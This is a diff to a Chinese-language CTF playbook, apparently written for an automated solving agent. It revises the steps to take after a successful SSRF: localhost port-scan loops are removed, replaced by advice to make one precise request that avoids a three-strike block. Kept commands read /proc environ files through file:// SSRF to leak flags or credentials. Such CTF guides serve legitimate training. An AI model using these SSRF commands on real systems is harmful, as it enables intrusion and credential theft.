@@ -238,18 +238,12 @@ payloads_crlf = [
 
 **SSRF 成功后的标准动作（很多题 flag 在内网 API 中）：**
 ```bash
-# 1. 从 localhost 视角扫描常见内网服务端口
-for port in 80 3000 5000 6379 8000 8080 8888 9000; do
-  curl -s "http://TARGET/fetch?url=http://127.0.0.1:$port/" -o /dev/null -w "port $port: %{http_code}\n"
-done
+# 不要扫端口/网段（每个变体计一次预算，3 次即封）。
+# 优先从已泄露的配置/响应确定内网服务地址（如 /debug/config 的 internal_url、
+# 响应里的 token/端口），再精确访问一次：
+curl -s "http://TARGET/fetch?url=http://<已确认的内网地址>/"
 
-# 2. 对每个可达端口，访问 flag 相关路径
-for path in / /flag /admin /debug/config /api/flag /env /actuator/env; do
-  echo "=== $path ==="
-  curl -s "http://TARGET/fetch?url=http://127.0.0.1:PORT$path"
-done
-
-# 3. 读取环境变量
+# 读取环境变量（精确的一次请求，最可能直接泄露 flag/凭据）
 curl -s "http://TARGET/fetch?url=file:///proc/1/environ" | tr '\0' '\n'
 curl -s "http://TARGET/fetch?url=file:///proc/self/environ" | tr '\0' '\n'
 
